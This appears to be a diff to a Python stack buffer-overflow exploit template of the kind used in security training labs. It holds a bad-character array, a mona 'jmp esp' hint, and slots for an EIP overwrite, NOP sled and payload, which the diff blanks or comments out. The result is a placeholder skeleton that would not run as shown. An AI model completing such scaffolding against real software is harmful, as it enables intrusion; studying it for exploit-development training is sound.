@@ -11,6 +11,7 @@ badchars = b"".join([ struct.pack("<B",x) for x in range(1, 256) ] )
 # SHELCODE
 #
 
+
 ####
 
 prefix = b""
@@ -27,12 +28,10 @@ payload = b""
 
 #EIP
 # !mona jmp -r esp -cpb "\x00"
-eip = b""
 # eip = b"BBBB"
-# eip = struct.pack("<I", 0x62501203)
+# eip = struct.pack("<I", 0x)
 
 #nop_sled
-nopsled = b""
 # padding = b"\x90" * 16
 
 postfix = b"C" * (total - len(prefix) - len(overflow) - len(eip) - len(payload) - len(nopsled) )
@@ -40,10 +39,10 @@ postfix = b"C" * (total - len(prefix) - len(overflow) - len(eip) - len(payload) 
 buffer = [
   prefix,
   overflow,
-  eip,
-  nopsled,
+  # eip,
+  # nopsled,
   payload,
-  postfix
+  # postfix
 ] 
 buffer = b"".join(buffer)
 
